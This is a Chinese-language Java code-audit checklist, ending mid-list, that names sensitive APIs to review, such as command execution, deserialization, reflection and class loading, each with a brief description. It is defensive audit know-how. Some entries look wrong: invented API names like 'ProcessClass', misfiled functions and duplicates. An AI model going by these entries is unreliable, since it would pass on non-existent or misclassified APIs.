File.isAbsolute() \uff1a\u2f64\u4e8e\u68c0\u67e5\u2f42\u4ef6\u8def\u5f84\u662f\u5426\u662f\u7edd\u5bf9\u8def\u5f84\u3002 File.length() \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f42\u4ef6\u7684\u2f24\u2f29\u3002 File.listRoots() \uff1a\u2f64\u4e8e\u83b7\u53d6\u7cfb\u7edf\u4e2d\u53ef\u2f64\u7684\u2f42\u4ef6\u7cfb\u7edf\u6839\u2f6c\u5f55\u3002 File.getAbsolutePath() \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f42\u4ef6\u7684\u7edd\u5bf9\u8def\u5f84\u3002 File.getCanonicalPath() \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f42\u4ef6\u7684\u89c4\u8303\u8def\u5f84\u3002 File.getParent() \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f42\u4ef6\u7684\u2f57\u2f6c\u5f55\u3002 File.getName() \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f42\u4ef6\u7684\u540d\u79f0\u3002 File.getPath() \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f42\u4ef6\u7684\u8def\u5f84\u3002 File.lastModified() \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f42\u4ef6\u7684\u6700\u540e\u4fee\u6539\u65f6\u95f4\u3002 File.setLastModified() \uff1a\u2f64\u4e8e\u8bbe\u7f6e\u2f42\u4ef6\u7684\u6700\u540e\u4fee\u6539\u65f6\u95f4\u3002 File.renameTo() \uff1a\u2f64\u4e8e\u91cd\u547d\u540d\u2f42\u4ef6\u3002 File.getFreeSpace() \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f42\u4ef6\u7cfb\u7edf\u4e2d\u7a7a\u95f2\u7684\u78c1\u76d8\u7a7a\u95f4\u3002 File.getTotalSpace() \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f42\u4ef6\u7cfb\u7edf\u4e2d\u603b\u7684\u78c1\u76d8\u7a7a\u95f4\u3002 File.getUsableSpace() \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f42\u4ef6\u7cfb\u7edf\u4e2d\u53ef\u2f64\u7684\u78c1\u76d8\u7a7a\u95f4\u3002 \u6d89\u53ca\u2f79\u7edc\u8bbf\u95ee\u7684\u654f\u611f\u51fd\u6570\uff0c\u5305\u62ec\uff1a URL \uff1a\u2f64\u4e8e\u521b\u5efa\u2f00\u4e2a\u8868\u793a\u2f79\u7edc\u8d44\u6e90\u7684 URL \u3002 URLConnection \uff1a\u62bd\u8c61\u7c7b\uff0c\u8868\u793a\u5e94\u2f64\u7a0b\u5e8f\u4e0e URL \u4e4b\u95f4\u7684\u901a\u4fe1\u94fe\u63a5\u3002 HttpURLConnection \uff1a\u2f64\u4e8e\u6253\u5f00\u4e0e HTTP \u670d\u52a1\u5668\u7684\u901a\u4fe1\u94fe\u63a5\u3002 HttpClient \uff1a\u2f64\u4e8e\u6267\u2f8f HTTP \u8bf7\u6c42\u7684\u5ba2\u6237\u7aef\u3002 InetAddress \uff1a\u2f64\u4e8e\u6807\u8bc6\u2f79\u7edc\u4e0a\u7684\u786c\u4ef6\u8d44\u6e90\u3002 ServerSocket \uff1a\u2f64\u4e8e\u7b49\u5f85\u6765\u2f83\u5ba2\u6237\u7aef\u7684\u8fde\u63a5\u3002 Socket \uff1a\u2f64\u4e8e\u901a\u8fc7\u2f79\u7edc\u8fdb\u2f8f\u901a\u4fe1\u7684\u5ba2\u6237\u7aef\u6216\u670d\u52a1\u5668\u3002 HttpServlet \uff1a\u2f64\u4e8e\u63d0\u4f9b\u57fa\u4e8e HTTP \u7684\u670d\u52a1\u7684\u62bd\u8c61\u7c7b\u3002 ServletRequest \uff1a\u2f64\u4e8e\u8868\u793a HTTP \u8bf7\u6c42\u7684\u63a5\u2f1d\u3002 ServletResponse \uff1a\u2f64\u4e8e\u8868\u793a HTTP \u54cd\u5e94\u7684\u63a5\u2f1d\u3002 HttpSession \uff1a\u2f64\u4e8e\u5728\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u4fdd\u5b58\u4f1a\u8bdd\u4fe1\u606f\u7684\u63a5\u2f1d\u3002 Cookie \uff1a\u2f64\u4e8e\u5728\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u4fdd\u5b58\u4fe1\u606f\u7684\u7c7b\u3002 SessionCookieConfig \uff1a\u2f64\u4e8e\u914d\u7f6e\u4f1a\u8bdd Cookie \u7684\u63a5\u2f1d\u3002 HttpServletRequest \uff1a\u2f64\u4e8e\u8868\u793a HTTP \u8bf7\u6c42\u7684\u63a5\u2f1d\u3002 HttpServletResponse \uff1a\u2f64\u4e8e\u8868\u793a HTTP \u54cd\u5e94\u7684\u63a5\u2f1d\u3002 HttpSessionBindingListener \uff1a\u2f64\u4e8e\u76d1\u542c\u5bf9\u8c61\u7ed1\u5b9a\u548c\u89e3\u9664\u7ed1\u5b9a\u4e8b\u4ef6\u7684\u63a5\u2f1d\u3002 HttpSessionActivationListener \uff1a\u2f64\u4e8e\u76d1\u542c\u4f1a\u8bdd\u6d3b\u52a8\u548c\u949d\u5316\u4e8b\u4ef6\u7684\u63a5\u2f1d\u3002 HttpSessionAttributeListener \uff1a\u2f64\u4e8e\u76d1\u542c\u4f1a\u8bdd\u5c5e\u6027\u7684\u53d8\u5316\u4e8b\u4ef6\u7684\u63a5\u2f1d\u3002 HttpSessionBindingEvent \uff1a\u8868\u793a\u4f1a\u8bdd\u7ed1\u5b9a\u548c\u89e3\u9664\u7ed1\u5b9a\u4e8b\u4ef6\u7684\u7c7b\u3002 \u6d89\u53ca\u6570\u636e\u5e93\u7684\u51fd\u6570\u5305\u62ec\uff1a DriverManager \uff1a\u2f64\u4e8e\u7ba1\u7406 JDBC \u9a71\u52a8\u7a0b\u5e8f\u7684\u7c7b\u3002 Connection \uff1a\u8868\u793a\u6570\u636e\u5e93\u8fde\u63a5\u7684\u63a5\u2f1d\u3002 Statement \uff1a\u2f64\u4e8e\u6267\u2f8f SQL \u8bed\u53e5\u7684\u63a5\u2f1d\u3002 PreparedStatement \uff1a\u2f64\u4e8e\u6267\u2f8f\u9884\u7f16\u8bd1\u7684 SQL \u8bed\u53e5\u7684\u63a5\u2f1d\u3002 CallableStatement \uff1a\u2f64\u4e8e\u6267\u2f8f\u5b58\u50a8\u8fc7\u7a0b\u7684\u63a5\u2f1d\u3002 ResultSet \uff1a\u2f64\u4e8e\u4fdd\u5b58\u6570\u636e\u5e93\u67e5\u8be2\u7ed3\u679c\u7684\u63a5\u2f1d\u3002 DataSource \uff1a\u63a5\u2f1d\uff0c\u8868\u793a\u63d0\u4f9b\u8fde\u63a5\u7684\u6570\u636e\u6e90\u3002 ConnectionPoolDataSource \uff1a\u63a5\u2f1d\uff0c\u8868\u793a\u63d0\u4f9b\u8fde\u63a5\u6c60\u7684\u6570\u636e\u6e90\u3002 PooledConnection \uff1a\u8868\u793a\u4ece\u8fde\u63a5\u6c60\u4e2d\u83b7\u53d6\u7684\u8fde\u63a5\u7684\u63a5\u2f1d\u3002 RowSet \uff1a\u2f64\u4e8e\u5b58\u50a8\u7ed3\u679c\u96c6\u7684\u63a5\u2f1d\u3002 RowSetFactory \uff1a\u2f64\u4e8e\u521b\u5efa RowSet \u5bf9\u8c61\u7684\u2f2f\u2f1a\u7c7b\u3002 RowSetProvider \uff1a\u2f64\u4e8e\u521b\u5efa RowSetFactory \u5bf9\u8c61\u7684\u2f2f\u2f1a\u7c7b\u3002 RowSetMetaData \uff1a\u2f64\u4e8e\u63cf\u8ff0 RowSet \u5bf9\u8c61\u7ed3\u6784\u7684\u63a5\u2f1d\u3002 RowSetEvent \uff1a\u8868\u793a RowSet \u4e8b\u4ef6\u7684\u7c7b\u3002 RowSetListener \uff1a\u2f64\u4e8e\u76d1\u542c RowSet \u4e8b\u4ef6\u7684\u63a5\u2f1d\u3002 \u6d89\u53ca\u8fd0\u2f8f\u547d\u4ee4\u7684\u654f\u611f\u51fd\u6570\uff1a Runtime \uff1a\u2f64\u4e8e\u6267\u2f8f\u5916\u90e8\u7a0b\u5e8f\u7684\u7c7b\u3002 Process \uff1a\u8868\u793a\u5916\u90e8\u7a0b\u5e8f\u7684\u63a5\u2f1d\u3002 ProcessBuilder \uff1a\u2f64\u4e8e\u521b\u5efa\u8fdb\u7a0b\u7684\u7c7b\u3002 ProcessClass \uff1a\u2f64\u4e8e\u63cf\u8ff0\u8fdb\u7a0b\u7684\u7c7b\u3002 ProcessHandle \uff1a\u2f64\u4e8e\u83b7\u53d6\u8fdb\u7a0b\u4fe1\u606f\u7684\u63a5\u2f1d\u3002 ProcessHandle.Info \uff1a\u2f64\u4e8e\u83b7\u53d6\u8fdb\u7a0b\u4fe1\u606f\u7684\u7c7b\u3002 ProcessBuilder.Redirect \uff1a\u2f64\u4e8e\u91cd\u5b9a\u5411\u8fdb\u7a0b\u8f93\u2f0a/\u8f93\u51fa\u7684\u7c7b\u3002 ProcessBuilder.Redirect.Type \uff1a\u8868\u793a\u91cd\u5b9a\u5411\u7c7b\u578b\u7684\u679a\u4e3e\u7c7b\u3002 ProcessHandle.Redirect \uff1a\u2f64\u4e8e\u91cd\u5b9a\u5411\u8fdb\u7a0b\u8f93\u2f0a/\u8f93\u51fa\u7684\u63a5\u2f1d\u3002 ProcessHandle.Redirect.Type \uff1a\u8868\u793a\u91cd\u5b9a\u5411\u7c7b\u578b\u7684\u679a\u4e3e\u7c7b Java\u6e90\u7801\u5ba1\u8ba1\u6d89\u53ca\u5e8f\u5217\u5316\u51fd\u6570\u7684\u6f0f\u6d1e\u51fd\u6570\u5305\u62ec\uff1a ObjectInputStream.readObject \uff1a\u2f64\u4e8e\u53cd\u5e8f\u5217\u5316\u5bf9\u8c61\u7684\u2f45\u6cd5\u3002 ObjectInputStream.readUnshared \uff1a\u2f64\u4e8e\u53cd\u5e8f\u5217\u5316\u672a\u5171\u4eab\u5bf9\u8c61\u7684\u2f45\u6cd5\u3002 ObjectInputStream.defaultReadObject \uff1a\u2f64\u4e8e\u53cd\u5e8f\u5217\u5316\u9ed8\u8ba4\u5e8f\u5217\u5316\u5b57\u6bb5\u7684\u2f45\u6cd5\u3002 ObjectOutputStream.writeObject \uff1a\u2f64\u4e8e\u5e8f\u5217\u5316\u5bf9\u8c61\u7684\u2f45\u6cd5\u3002 ObjectOutputStream.writeUnshared \uff1a\u2f64\u4e8e\u5e8f\u5217\u5316\u672a\u5171\u4eab\u5bf9\u8c61\u7684\u2f45\u6cd5\u3002 ObjectOutputStream.defaultWriteObject \uff1a\u2f64\u4e8e\u5e8f\u5217\u5316\u9ed8\u8ba4\u5e8f\u5217\u5316\u5b57\u6bb5\u7684\u2f45\u6cd5\u3002 ObjectInputStream.resolveClass \uff1a\u2f64\u4e8e\u89e3\u6790\u7c7b\u540d\u79f0\u7684\u2f45\u6cd5\u3002 ObjectOutputStream.annotateClass \uff1a\u2f64\u4e8e\u6ce8\u89e3\u7c7b\u7684\u2f45\u6cd5\u3002 ObjectOutputStream.annotateProxyClass \uff1a\u2f64\u4e8e\u6ce8\u89e3\u4ee3\u7406\u7c7b\u7684\u2f45\u6cd5\u3002 \u6d89\u53ca\u53cd\u5c04\u51fd\u6570\u7684\u6f0f\u6d1e\u51fd\u6570\u5305\u62ec\uff1a Class.forName \uff1a\u2f64\u4e8e\u52a0\u8f7d\u7c7b\u7684\u9759\u6001\u2f45\u6cd5\u3002 Class.newInstance \uff1a\u2f64\u4e8e\u521b\u5efa\u5b9e\u4f8b\u7684\u2f45\u6cd5\u3002 Class.getMethod \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f45\u6cd5\u7684\u2f45\u6cd5\u3002 Class.getConstructor \uff1a\u2f64\u4e8e\u83b7\u53d6\u6784\u9020\u51fd\u6570\u7684\u2f45\u6cd5\u3002 Constructor.newInstance \uff1a\u2f64\u4e8e\u8c03\u2f64\u6784\u9020\u51fd\u6570\u7684\u2f45\u6cd5\u3002 Method.invoke \uff1a\u2f64\u4e8e\u8c03\u2f64\u2f45\u6cd5\u7684\u2f45\u6cd5\u3002 ClassLoader.loadClass \uff1a\u2f64\u4e8e\u52a0\u8f7d\u7c7b\u7684\u2f45\u6cd5\u3002 Method.setAccessible \uff1a\u2f64\u4e8e\u8bbe\u7f6e\u8bbf\u95ee\u6743\u9650\u7684\u2f45\u6cd5\u3002 Field.setAccessible \uff1a\u2f64\u4e8e\u8bbe\u7f6e\u8bbf\u95ee\u6743\u9650\u7684\u2f45\u6cd5\u3002 Class.getDeclaredFields \uff1a\u2f64\u4e8e\u83b7\u53d6\u7c7b\u7684\u6240\u6709\u5b57\u6bb5\u7684\u2f45\u6cd5\u3002 Class.getDeclaredMethods \uff1a\u2f64\u4e8e\u83b7\u53d6\u7c7b\u7684\u6240\u6709\u2f45\u6cd5\u7684\u2f45\u6cd5\u3002 Class.getDeclaredConstructors \uff1a\u2f64\u4e8e\u83b7\u53d6\u7c7b\u7684\u6240\u6709\u6784\u9020\u51fd\u6570\u7684\u2f45\u6cd5\u3002 Class.getInterfaces \uff1a\u2f64\u4e8e\u83b7\u53d6\u7c7b\u5b9e\u73b0\u7684\u63a5\u2f1d\u7684\u2f45\u6cd5\u3002 Field.get \uff1a\u2f64\u4e8e\u83b7\u53d6\u5b57\u6bb5\u503c\u7684\u2f45\u6cd5\u3002 Field.set \uff1a\u2f64\u4e8e\u8bbe\u7f6e\u5b57\u6bb5\u503c\u7684\u2f45\u6cd5\u3002 MethodHandles.lookup \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f45\u6cd5\u53e5\u67c4\u7684\u2f45\u6cd5\u3002 MethodHandle.invoke \uff1a\u2f64\u4e8e\u8c03\u2f64\u2f45\u6cd5\u7684\u2f45\u6cd5\u3002 MethodHandle.invokeExact \uff1a\u2f64\u4e8e\u8c03\u2f64\u2f45\u6cd5\u7684\u2f45\u6cd5\uff0c\u5305\u62ec\u53c2\u6570\u7c7b\u578b\u548c\u8fd4\u56de\u503c\u7c7b\u578b\u3002 Constructor.setAccessible \uff1a\u2f64\u4e8e\u8bbe\u7f6e\u6784\u9020\u51fd\u6570\u7684\u8bbf\u95ee\u6743\u9650\u7684\u2f45\u6cd5\u3002 Method.getModifiers \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f45\u6cd5\u7684\u4fee\u9970\u7b26\u7684\u2f45\u6cd5\u3002 Field.getModifiers \uff1a\u2f64\u4e8e\u83b7\u53d6\u5b57\u6bb5\u7684\u4fee\u9970\u7b26\u7684\u2f45\u6cd5\u3002 Modifier.isPublic \uff1a\u2f64\u4e8e\u5224\u65ad\u4fee\u9970\u7b26\u662f\u5426\u4e3a public \u7684\u9759\u6001\u2f45\u6cd5\u3002 Modifier.isProtected \uff1a\u2f64\u4e8e\u5224\u65ad\u4fee\u9970\u7b26\u662f\u5426\u4e3a protected \u7684\u9759\u6001\u2f45\u6cd5\u3002 Modifier.isPrivate \uff1a\u2f64\u4e8e\u5224\u65ad\u4fee\u9970\u7b26\u662f\u5426\u4e3a private \u7684\u9759\u6001\u2f45\u6cd5\u3002 Constructor.newInstance \uff1a\u2f64\u4e8e\u521b\u5efa\u7c7b\u7684\u5b9e\u4f8b\u7684\u2f45\u6cd5\u3002 Proxy.newProxyInstance \uff1a\u2f64\u4e8e\u521b\u5efa\u52a8\u6001\u4ee3\u7406\u7c7b\u7684\u2f45\u6cd5 \u6d89\u53ca\u52a8\u6001\u4ee3\u7406\u51fd\u6570\u7684\u6f0f\u6d1e\u51fd\u6570\u4e3b\u8981\u6709\uff1a Proxy.newProxyInstance \uff1a\u2f64\u4e8e\u521b\u5efa\u52a8\u6001\u4ee3\u7406\u7c7b\u7684\u2f45\u6cd5\u3002 InvocationHandler.invoke \uff1a\u2f64\u4e8e\u5b9e\u73b0\u52a8\u6001\u4ee3\u7406\u7684\u2f45\u6cd5\u3002 Class.getClasses \uff1a\u2f64\u4e8e\u83b7\u53d6\u7c7b\u4e2d\u6240\u6709\u516c\u5171\u5185\u90e8\u7c7b\u7684\u2f45\u6cd5\u3002 Class.getDeclaredClasses \uff1a\u2f64\u4e8e\u83b7\u53d6\u7c7b\u4e2d\u6240\u6709\u58f0\u660e\u7684\u5185\u90e8\u7c7b\u7684\u2f45\u6cd5\u3002 Class.getDeclaredMethods \uff1a\u2f64\u4e8e\u83b7\u53d6\u7c7b\u4e2d\u6240\u6709\u58f0\u660e\u7684\u2f45\u6cd5\u7684\u2f45\u6cd5\u3002 Class.getMethod \uff1a\u2f64\u4e8e\u83b7\u53d6\u7c7b\u4e2d\u6307\u5b9a\u7684\u516c\u5171\u2f45\u6cd5\u7684\u2f45\u6cd5\u3002 Method.getDeclaringClass \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f45\u6cd5\u6240\u5c5e\u7c7b\u7684\u2f45\u6cd5\u3002 Method.getName \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f45\u6cd5\u540d\u79f0\u7684\u2f45\u6cd5\u3002 Method.getParameterTypes \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f45\u6cd5\u53c2\u6570\u7c7b\u578b\u7684\u2f45\u6cd5\u3002 Method.getReturnType \uff1a\u2f64\u4e8e\u83b7\u53d6\u2f45\u6cd5\u8fd4\u56de\u503c\u7c7b\u578b\u7684\u2f45\u6cd5\u3002 Method.invoke \uff1a\u2f64\u4e8e\u8c03\u2f64\u2f45\u6cd5\u7684\u2f45\u6cd5\u3002 \u6d89\u53ca\u7ebf\u7a0b\u51fd\u6570\u7684\u6f0f\u6d1e\u51fd\u6570\uff1a Thread.start \uff1a\u2f64\u4e8e\u542f\u52a8\u7ebf\u7a0b\u7684\u2f45\u6cd5\u3002 Thread.stop \uff1a\u2f64\u4e8e\u505c\u2f4c\u7ebf\u7a0b\u7684\u2f45\u6cd5\u3002 Thread.suspend \uff1a\u2f64\u4e8e\u6302\u8d77\u7ebf\u7a0b\u7684\u2f45\u6cd5\u3002 Thread.resume \uff1a\u2f64\u4e8e\u6062\u590d\u7ebf\u7a0b\u7684\u2f45\u6cd5\u3002 Thread.setDaemon \uff1a\u2f64\u4e8e\u8bbe\u7f6e\u7ebf\u7a0b\u662f\u5426\u4e3a\u5b88\u62a4\u7ebf\u7a0b\u7684\u2f45\u6cd5\u3002 Thread.setName \uff1a\u2f64\u4e8e\u8bbe\u7f6e\u7ebf\u7a0b\u540d\u79f0\u7684\u2f45\u6cd5\u3002 Thread.setPriority \uff1a\u2f64\u4e8e\u8bbe\u7f6e\u7ebf\u7a0b\u4f18\u5148\u7ea7\u7684\u2f45\u6cd5\u3002 Thread.join \uff1a\u2f64\u4e8e\u7b49\u5f85\u7ebf\u7a0b\u7ed3\u675f\u7684\u2f45\u6cd5\u3002 Thread.interrupt \uff1a\u2f64\u4e8e\u4e2d\u65ad\u7ebf\u7a0b\u7684\u2f45\u6cd5\u3002 \u6d89\u53ca\u7cfb\u7edf\u5c5e\u6027\u51fd\u6570\u7684\u6f0f\u6d1e\u51fd\u6570\uff1a System.getProperties \uff1a\u2f64\u4e8e\u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u5c5e\u6027\u7684\u2f45\u6cd5\u3002 System.getProperty \uff1a\u2f64\u4e8e\u83b7\u53d6\u6307\u5b9a\u7cfb\u7edf\u5c5e\u6027\u7684\u2f45\u6cd5\u3002 System.setProperties \uff1a\u2f64\u4e8e\u8bbe\u7f6e\u5f53\u524d\u7cfb\u7edf\u5c5e\u6027\u7684\u2f45\u6cd5\u3002 System.setProperty \uff1a\u2f64\u4e8e\u8bbe\u7f6e\u6307\u5b9a\u7cfb\u7edf\u5c5e\u6027\u7684\u2f45\u6cd5\u3002 System.clearProperty \uff1a\u2f64\u4e8e\u6e05\u9664\u6307\u5b9a\u7cfb\u7edf\u5c5e\u6027\u7684\u2f45\u6cd5\u3002 System.getenv \uff1a\u2f64\u4e8e\u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u73af\u5883\u53d8\u91cf\u7684\u2f45\u6cd5\u3002 System.getenv \uff1a\u2f64\u4e8e\u83b7\u53d6\u6307\u5b9a\u7cfb\u7edf\u73af\u5883\u53d8\u91cf\u7684\u2f45\u6cd5\u3002 System.setSecurityManager \uff1a\u2f64\u4e8e\u8bbe\u7f6e\u5f53\u524d\u7cfb\u7edf\u5b89\u5168\u7ba1\u7406\u5668\u7684\u2f45\u6cd5\u3002 System.getSecurityManager \uff1a\u2f64\u4e8e\u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u5b89\u5168\u7ba1\u7406\u5668\u7684\u2f45\u6cd5\u3002 System.lineSeparator \uff1a\u2f64\u4e8e\u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u6362\u2f8f\u7b26\u7684\u5c5e\u6027\u3002 System.in \uff1a\u2f64\u4e8e\u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u6807\u51c6\u8f93\u2f0a\u6d41\u7684\u5c5e\u6027\u3002 System.out \uff1a\u2f64\u4e8e\u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u6807\u51c6\u8f93\u51fa\u6d41\u7684\u5c5e\u6027\u3002 System.err \uff1a\u2f64\u4e8e\u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u6807\u51c6\u9519\u8bef\u6d41\u7684\u5c5e\u6027\u3002 System.gc \uff1a\u2f64\u4e8e\u8bf7\u6c42\u7cfb\u7edf\u8fdb\u2f8f\u5783\u573e\u56de\u6536\u7684\u2f45\u6cd5\u3002 System.runFinalization \uff1a\u2f64\u4e8e\u8bf7\u6c42\u7cfb\u7edf\u8fd0\u2f8f\u6302\u8d77\u7684\u5bf9\u8c61\u7684 finalize \u2f45\u6cd5\u7684\u2f45\u6cd5 Java\u6e90\u7801\u5ba1\u8ba1\u6d89\u53ca\u7684\u7cfb\u7edf\u73af\u5883\u53d8\u91cf\u51fd\u6570\u5982\u4e0b\uff1a System.getenv() : \u83b7\u53d6\u7cfb\u7edf\u73af\u5883\u53d8\u91cf\u7684\u503c\uff0c\u4f8b\u5982 System.getenv(\"PATH\") \u53ef\u4ee5\u83b7\u53d6 PATH \u73af\u5883\u53d8\u91cf\u7684\u503c\u3002 System.getProperty() : \u83b7\u53d6 Java \u7cfb\u7edf\u5c5e\u6027\u7684\u503c\u3002 System.getProperty(\"user.home\") \u83b7\u53d6\u5f53\u524d\u2f64\u6237\u7684 home \u2f6c\u5f55\u8def\u5f84\u3002 Runtime.getRuntime().exec() : \u53ef\u4ee5\u6267\u2f8f\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4\u3002 ProcessBuilder.start() : \u540c\u4e0a \u8fd9\u4e9b\u51fd\u6570\u53ef\u80fd\u4f1a\u5bfc\u81f4\u547d\u4ee4\u6ce8\u2f0a\u6f0f\u6d1e\uff0c\u5982\u679c\u7a0b\u5e8f\u6ca1\u6709\u6b63\u786e\u8fc7\u6ee4\u8f93\u2f0a\u6570\u636e\u6216\u6ca1\u6709\u5bf9\u8f93\u51fa\u6570\u636e\u8fdb\u2f8f \u8f6c\u4e49\uff0c\u53ef\u80fd\u5bfc\u81f4\u547d\u4ee4\u6267\u2f8f\u3002 \u6d89\u53ca\u7c7b\u52a0\u8f7d\u5668\u51fd\u6570\u7684\u6f0f\u6d1e\u51fd\u6570\u5982\u4e0b\uff1a Class.forName() : \u901a\u8fc7\u7ed9\u5b9a\u7684\u7c7b\u540d\u52a0\u8f7d\u7c7b\u3002 ClassLoader.loadClass() : \u901a\u8fc7\u7ed9\u5b9a\u7684\u7c7b\u540d\u52a0\u8f7d\u7c7b\u3002 ClassLoader.defineClass() : \u901a\u8fc7\u7ed9\u5b9a\u7684\u5b57\u8282\u6570\u7ec4\u5b9a\u4e49\u2f00\u4e2a\u65b0\u7684\u7c7b\u3002 ClassLoader.findLoadedClass() : \u53ef\u4ee5\u68c0\u67e5\u6307\u5b9a\u7684\u7c7b\u662f\u5426\u5df2\u7ecf\u88ab\u52a0\u8f7d \u5b89\u5168\u7ba1\u7406\u5668\u6f0f\u6d1e\u51fd\u6570 SecurityManager.checkPermission() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u68c0\u67e5\u662f\u5426\u5141\u8bb8\u6267\u2f8f\u6307\u5b9a\u7684\u64cd\u4f5c\u3002 SecurityManager.checkRead() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u68c0\u67e5\u662f\u5426\u5141\u8bb8\u8bfb\u53d6\u6307\u5b9a\u7684\u2f42\u4ef6\u3002 SecurityManager.checkWrite() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u68c0\u67e5\u662f\u5426\u5141\u8bb8\u5199\u2f0a\u6307\u5b9a\u7684\u2f42\u4ef6\u3002 SecurityManager.checkAccept() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u68c0\u67e5\u662f\u5426\u5141\u8bb8\u63a5\u53d7\u6765\u2f83\u6307\u5b9a\u5730\u5740\u7684\u8fde\u63a5\u3002 SecurityManager.checkConnect() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u68c0\u67e5\u662f\u5426\u5141\u8bb8\u8fde\u63a5\u5230\u6307\u5b9a\u5730\u5740\u3002 SecurityManager.checkListen() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u68c0\u67e5\u662f\u5426\u5141\u8bb8\u5728\u6307\u5b9a\u7aef\u2f1d\u4e0a\u76d1\u542c\u8fde\u63a5 Java\u4e2d\u5173\u4e8e\u5185\u5b58\u7ba1\u7406\u51fd\u6570\u7684\u6f0f\u6d1e\u51fd\u6570\uff1a Runtime.getRuntime().exec() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u6267\u2f8f\u6307\u5b9a\u7684\u547d\u4ee4\u3002 System.load() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u52a0\u8f7d\u6307\u5b9a\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u3002 System.loadLibrary() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u52a0\u8f7d\u6307\u5b9a\u7684\u672c\u5730\u5e93\u3002 System.gc() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u5f3a\u5236\u89e6\u53d1\u5783\u573e\u56de\u6536\u3002 System.runFinalization() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u5f3a\u5236\u8c03\u2f64\u6240\u6709\u5bf9\u8c61\u7684 finalize \u2f45\u6cd5\u3002 java.lang.ref.WeakReference.get() : \u2f64\u4ee5\u83b7\u53d6\u5f31\u5f15\u2f64\u5bf9\u8c61\u7684\u503c\u3002 java.lang.ref.SoftReference.get() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u83b7\u53d6\u8f6f\u5f15\u2f64\u5bf9\u8c61\u7684\u503c\u3002 java.lang.ref.PhantomReference.get() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u83b7\u53d6\u5e7d\u7075\u5f15\u2f64\u5bf9\u8c61\u7684\u503c Java\u4e2d\u6d89\u53ca\u5bc6\u7801\u5b58\u50a8\u51fd\u6570\u7684\u6f0f\u6d1e\u51fd\u6570\uff1a MessageDigest.getInstance() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u521b\u5efa\u6d88\u606f\u6458\u8981\u5bf9\u8c61\uff0c\u2f64\u4e8e\u5bf9\u5bc6\u7801\u8fdb\u2f8f\u54c8\u5e0c\u8fd0 \u7b97\u3002 PBEKeySpec.PBEKeySpec() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u521b\u5efa\u57fa\u4e8e\u2f1d\u4ee4\u7684\u5bc6\u94a5\u6750\u6599\u3002 SecretKeyFactory.getInstance() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u521b\u5efa\u5bc6\u94a5\u2f2f\u2f1a\u5bf9\u8c61\uff0c\u2f64\u4e8e\u2f63\u6210\u5bc6\u94a5\u3002 KeyStore.load() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u52a0\u8f7d\u5bc6\u94a5\u5e93\u3002\u5982\u679c\u53ef\u4ee5\u63a7\u5236\u8f93\u2f0a\u7684\u5bc6\u94a5\u5e93\u2f42\u4ef6\uff0c\u53ef\u80fd\u2f64\u6765\u52a0 \u8f7d\u6076\u610f\u5bc6\u94a5\u5e93\u3002 PasswordEncryptor.encrypt() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u5bf9\u5bc6\u7801\u8fdb\u2f8f\u52a0\u5bc6 Java\u4e2d\u6d89\u53ca\u52a0\u5bc6\u51fd\u6570\u7684\u6f0f\u6d1e\u51fd\u6570\uff1a Cipher.getInstance() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u521b\u5efa\u52a0\u5bc6\u5bf9\u8c61\uff0c\u2f64\u4e8e\u5bf9\u6570\u636e\u8fdb\u2f8f\u52a0\u5bc6\u3002 KeyGenerator.getInstance() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u521b\u5efa\u5bc6\u94a5\u2f63\u6210\u5668\u5bf9\u8c61\uff0c\u2f64\u4e8e\u2f63\u6210\u5bc6\u94a5\u3002 KeyFactory.getInstance() : \u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u521b\u5efa\u5bc6\u94a5\u2f2f\u2f1a\u5bf9\u8c61\uff0c\u2f64\u4e8e\u2f63\u6210\u5bc6\u94a5\u3002 Signature.getInstance() : 